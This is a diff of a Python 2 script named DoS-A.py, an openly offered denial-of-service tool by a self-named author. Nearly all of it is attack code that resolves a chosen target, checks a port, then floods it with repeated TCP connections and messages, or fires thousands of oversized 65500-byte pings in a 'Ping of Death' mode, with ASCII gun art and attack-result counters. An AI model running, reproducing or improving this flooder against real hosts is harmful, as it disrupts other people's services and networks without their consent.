@@ -1,96 +1,167 @@
 #!/usr/bin/python2
-###############################
-import sys, optparse, platform
-sys.path.append('./lib/')
-import tools_core
-import socket
-##############################
-opsys = platform.system()
-usage_utama = "[?] Use 'DoS-A.py --help' to show Help Contents"
-##############################
-def main():
-	############################
-	dos_port = 80
-	dos_msg = "Hey...I Love You"
-	dos_times = 10000
-	###########################
-	tools_core.clearscreen(opsys)
-	tools_core.judul()
+#!/usr/env python2
+
+# Copyright by M-XacT-666
+''' Script Kiddie, learn this script and modify with Your own style.
+    Do not Paste and Copy it.
+    Changing the Variabel and the Author Name didn't make You be a Programmer '''
+# Note: ASCII Art is copyrighted to Steven Paul Adams
+#       visit: https://www.asciiart.eu/weapons/guns
+
+import socket,argparse,platform,os
+if platform.system() == 'Windows':
+	os.system('cls')
+else:
+	os.system('clear')
+def jeda():
+	raw_input("Press [ENTER] ")
+
+parser = argparse.ArgumentParser()
+parser.add_argument("--target",dest='target',help="Target HOST/IP",type=str)
+parser.add_argument("--port",dest='port',help="Port to Attack",type=int,default=80)
+parser.add_argument("--total",dest='total',help="Total Attack",type=int,default=10000)
+parser.add_argument("--mode",dest='mode',help="Attack Mode (check EXAMPLE.txt)",type=str,default='syn')
+parser.add_argument("--message",dest='message',help="Message to send (syn only)",type=str,default='Attacked with DoS-A !!!')
+options = parser.parse_args()
+
+if options.target == '' or options.target == 'None' or options.target == None:
+	print ""
+	print "[!] Error: Target unidentificated! Please check again"
+	print "           Your command! learn on 'EXAMPLE.txt'"
+	print "           or You can try run 'DoS-A.py --help' command"
+	print ""
+	jeda()
+	exit()
+
+try:
+	print ""
+	ip_address = socket.gethostbyname(options.target)
+except:
+	print "[!] Error: Can't find IP Address from {0}".format(options.target)
+	print "           check Your connection or check the Host Address!"
+	print ""
+	jeda()
+	exit()
+
+print '''
+   DoS-A.py ---> DoS Attack Tool writed in Python2
+   Coded by M-XacT-66
+
+ +--^----------,--------,-----,--------^-,
+ | |||||||||   `--------'     |          O
+ `+---------------------------^----------|
+   `\_,---------,---------,--------------'
+     / XXXXXX /'|       /'   Target        : {0}
+    / XXXXXX /  `\    /'     IP Address    : {1}
+   / XXXXXX /`-------'       Attacked Port : {2}
+  / XXXXXX /                 Total Attack  : {3}
+ / XXXXXX /                  Attack Mode   : {4}
+(________(                   Message       : {5}
+ `------'
+'''.format(options.target,ip_address,options.port,options.total,options.mode,options.message)
+'''
+print "[+] INFORMATION ABOUT ATTACK"
+print " |---> Target  : %s" % options.target
+print " |---> IP Address   : %s" % ip_address
+print " |---> Port    : %s" % options.port
+print " |---> Total Attack : %s" % options.total
+print " |---> Mode    : %s" % options.mode
+print " |---> Message : %s" % options.message
+print "[+] END OF INFORMATION ABOUT ATTACK"
+'''
+print ""
+confirm = raw_input("Confirmation (Y/n) > ")
+if confirm == "n" or confirm == "N" or confirm == "no" or confirm == "NO" or confirm == "No":
+	print ""
+	print "[-] Attack Canceled with Confirmation..."
+	print ""
+	exit()
+else:
+	pass
+
+if options.mode == "syn" or options.mode == "SYN" or options.mode == "Syn":
+	berhasil = 0
+	gagal = 0
+	pedang = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	pedang.settimeout(1)
 	try:
-		if sys.argv[1] == "-h" or "--help":
-			print "[X] Ex: DoS-A.py -u www.target.com --times 1000"
-			print "        DoS-A.py -u www.target.com -p 80 -t 1000"
+		print "[*] Checking if Port is Open..."
+		robek = pedang.connect_ex((ip_address,options.port))
+		if robek == 0:
+			print " |---> Port %s is Open!" % options.port
 			print ""
-	except IndexError:
-		None
-	parser = optparse.OptionParser()
-	parser.add_option("-u",dest="TARGET",help="Specify URL or Domain or IP Address to Attack")
-	parser.add_option("--url",dest="TARGET",help="Specify URL or Domain or IP Address to Attack")
-	parser.add_option("-p",dest="PORT",help="Specify Port to Attack (Default is 80)")
-	parser.add_option("--port",dest="PORT",help="Specify Port to Attack (Default is 80)")
-	parser.add_option("-t",dest="COUNT",help="How many Request to Send (Default is 10000)")
-	parser.add_option("--times",dest="COUNT",help="How many Request to Send (Default is 10000)")
-	parser.add_option("-m",dest="MESSAGES",help="Messages to Send with Request Packets [OPTIONAL]")
-	parser.add_option("--messages",dest="MESSAGES",help="Messages to Send with Request Packets [OPTIONAL]")
-	(options,args) = parser.parse_args()
-	if (options.TARGET == None) or (options.TARGET == "") or (bool(options.TARGET) == False):
-		print usage_utama
-		exit()
-	if (bool(options.TARGET) == True):
-		dos_target = str(options.TARGET)
-	if (bool(options.PORT) == True):
-		dos_port = int(options.PORT)
-	if (bool(options.COUNT) == True):
-		dos_times = int(options.COUNT)
-	if (bool(options.MESSAGES) == True):
-		dos_msg = str(options.MESSAGES)
-	### ATTACKING ###
-	print "[#]==============={ TARGET INFORMATION }===============[#]"
-	print " [>] TARGET           : %s" % dos_target
-	print " [>] PORT             : %s" % dos_port
-	print " [>] TOTAL REQUEST    : %s" % dos_times
-	print " [>] MESSAGES TO SEND : %s" % dos_msg
-	print "[#]==============={ END OF INFORMATION }===============[#]"
-	print ""
-	print "[*] Getting IP Address..."
-	try:
-		dos_ip = socket.gethostbyname(dos_target)
-		print "[+] IP Address : %s" % dos_ip
+			pass
+		else:
+			print " |---> Port %s is Closed :(" % options.port
+			print ""
+			jeda()
+			exit()
 	except:
-		print tools_core.err_cantcon
+		print "[-] Unknown Error has been occured!"
 		exit()
-	print ""
-	print "[*] Checking if Port {} is Open...".format(dos_port)
-	tes_core = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	tes_core.settimeout(1)
-	tes_hasil = tes_core.connect_ex((dos_ip,dos_port))
-	if tes_hasil == 0:
-		print "[+] Port {} is Open".format(dos_port)
-	else:
-		print tools_core.err_cantconp
-		exit()
-	print ""
-	confirm = raw_input("[CONFIRMATION]==={Press [ENTER] to Launch Attack}=> ")
-	print "[*] Launching Attack..."
-	print "[i] Press 'CTRL+C' to Stop Attack..."
-	print ""
-	for i in range(1,(dos_times + 1)):
+	print "[+] Syn Attack (TCP-Attack) is Launched to {0} with {1} Total Attack".format(ip_address,options.total)
+	for i in range(1,(options.total + 1)):
 		try:
-			ngehe = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-			ngehe.connect((dos_ip,dos_port))
-			ngehe.send(dos_msg)
-			ngehe.sendto(dos_msg,(dos_ip,dos_port))
-			ngehe.send(dos_msg)
-			print "[+] {0} Request has been sended to {1}".format(i,dos_ip)
+			pisau = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+			pisau.settimeout(0.5)
+			pisau.connect_ex((ip_address,options.port))
+			pisau.send(options.message)
+			pisau.sendto(options.message,(ip_address,options.port))
+			pisau.send(options.message)
+			print "[*]---[TCP]---[ {0} Request Successfully sended to {1} ]".format(i,ip_address)
+			berhasil += 1
 		except KeyboardInterrupt:
 			print ""
-			print "[!] Attack Canceled !!!"
-			tools_core.keluar()
+			print "[-] Attack Canceled with Keyboard Interrupt by User..."
+			print ""
+			jeda()
+			break
 		except:
-			exit()
+			print "[*]---[TCP]---[ Error when sending Request to {0} ]".format(ip_address)
+			gagal += 1
+			pass
 	print ""
-	print "[+] Job Complete...{} Request Successfuly sended to Target !".format(dos_times)
-	tools_core.keluar()
+	print "[+] ATTACK RESULT"
+	print " |---> Success : {0} from {1}".format(berhasil,options.total)
+	print " |---> Failure : {0}".format(gagal)
+	print ""
+	jeda()
+	exit()
 
-if __name__ == '__main__':
-	main()
+elif options.mode == "pod" or options.mode == "POD" or options.mode == "Pod" or options.mode == "PoD":
+	berhasil = 0
+	gagal = 0
+	if platform.system() == 'Windows' or platform.system() == 'windows' or platform.system() == "WINDOWS":
+		client_os = 'Windows'
+		perintah = 'ping -l 65500 -w 1 -n 1 {} > nul'.format(ip_address)
+	else:
+		client_os = 'Linux/Unix'
+		perintah = 'ping -s 65500 -W 1 -c 1 {} > nul'.format(ip_address)
+	print "[+] POD Attack (Ping Of Death) is Launched to {0} with {1} Total Attack".format(ip_address,options.total)
+	for i in range(1,(options.total + 1)):
+		try:
+			os.system(perintah)
+			print "[*]---[POD]---[ {0} Request Successfully sended to {1} ]".format(i,ip_address)
+			berhasil += 1
+		except KeyboardInterrupt:
+			print ""
+			print "[-] Attack Canceled with Keyboard Interrupt by User..."
+			print ""
+			jeda()
+			break
+		except:
+			print "[*]---[POD]---[ Error when sending Request to {0} ]".format(ip_address)
+			gagal += 1
+			pass
+	print ""
+	print "[+] ATTACK RESULT"
+	print " |---> Success : {0} from {1}".format(berhasil,options.total)
+	print " |---> Failure : {0}".format(gagal)
+	print ""
+	jeda()
+	exit()
+
+# Copyright by M-XacT-666
+# Script Kiddie, learn this script and modify with Your own style
+# Do not Paste and Copy it
+# Changing the Variabel and the Author Name didn't make You be a Programmer
